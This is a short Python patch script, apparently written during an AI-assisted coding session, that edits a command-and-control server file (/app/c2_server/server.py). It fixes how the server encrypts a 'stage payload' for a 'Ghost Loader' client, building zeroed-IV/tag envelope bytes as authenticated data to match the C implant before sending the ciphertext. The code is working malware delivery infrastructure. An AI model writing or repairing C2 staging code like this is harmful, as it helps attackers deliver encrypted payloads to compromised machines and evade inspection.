import sys

with open('/app/c2_server/server.py', 'r') as f:
    content = f.read()

# I need to match the python code carefully
# wait, if I encrypt the stage payload, but use AAD!
# In C:
# rc = aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env, sizeof(env), ct_buf, env.iv, env.tag);
# env.tag and env.iv are passed AFTER to store the result, meaning when aegis_encrypt is called, env.tag and env.iv are ZERO!
# So the AAD is the envelope struct with ZERO IV and ZERO TAG!
# Let's check python struct packing!

target = """                # Encrypt the stage for the client!
                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data)
                
                # The Envelope header must be authenticated! So we build it WITH empty tag first,
                # then use that as AAD to match the C-side exactly.
                # However, the user discovered the client passes the whole struct.
                # Let's pack it with the real tag immediately, but decrypt side uses modified AAD.
                seq = SERVER_CRYPTO.total_messages
                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\\x00'*16
                
                env_bytes = struct.pack(
                    ENVELOPE_FMT, 
                    C2_MAGIC, 
                    C2_MSG_STAGE_DATA, 
                    len(ciphertext), 
                    seq, 
                    iv, 
                    tag, 
                    node_id_bytes
                )
                
                log_print(f"  └─ Encrypted Stage Payload ({len(ciphertext)} bytes, IV: {iv.hex()})", Colors.GREEN)
                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                return env_bytes + ciphertext"""

replacement = """                seq = SERVER_CRYPTO.total_messages
                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\\x00'*16
                
                # We must construct the AAD envelope *before* encryption.
                # In the C client `aegis_encrypt` is called with the envelope as AAD, 
                # but the `iv` and `tag` fields within that envelope are 0 at the time of the call!
                aad_env = struct.pack(
                    ENVELOPE_FMT, 
                    C2_MAGIC, 
                    C2_MSG_STAGE_DATA, 
                    len(ghost_data), # length of ciphertext (same as plaintext for GCM)
                    seq, 
                    b'\\x00'*12, # IV is zero during AAD
                    b'\\x00'*16, # Tag is zero during AAD
                    node_id_bytes
                )

                # Encrypt the stage for the client using the correct AAD!
                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data, aad_env)
                
                # Now pack the FINAL envelope with the actual IV and TAG to send over the wire
                env_bytes = struct.pack(
                    ENVELOPE_FMT, 
                    C2_MAGIC, 
                    C2_MSG_STAGE_DATA, 
                    len(ciphertext), 
                    seq, 
                    iv, 
                    tag, 
                    node_id_bytes
                )
                
                log_print(f"  └─ Encrypted Stage Payload ({len(ciphertext)} bytes, IV: {iv.hex()})", Colors.GREEN)
                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                return env_bytes + ciphertext"""

if target in content:
    content = content.replace(target, replacement)
    with open('/app/c2_server/server.py', 'w') as f:
        f.write(content)
    print("Patch 2 applied.")
else:
    print("Target 2 not found.")

